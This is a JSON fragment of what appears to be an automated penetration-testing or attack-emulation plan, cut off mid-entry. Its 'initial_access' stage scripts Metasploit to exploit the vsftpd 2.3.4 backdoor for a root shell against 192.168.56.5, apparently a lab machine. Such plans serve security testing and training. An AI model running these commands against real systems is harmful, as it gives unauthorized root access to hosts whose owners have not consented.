            "stages": [
                {
                    "stage": "initial_access",
                    "description": "Exploit vsftpd backdoor for root shell access",
                    "commands": [
                        {
                            "type": "start_session",
                            "session_name": "vsftpd_session",
                            "command": "msfconsole -q"
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
                            "wait": 2
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RHOSTS 192.168.56.5",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "set RPORT 21",
                            "wait": 1
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "exploit -j",
                            "wait": 15
                        },
                        {
                            "type": "session_command",
                            "session_name": "vsftpd_session",
                            "command": "sessions -l",
                            "wait": 2
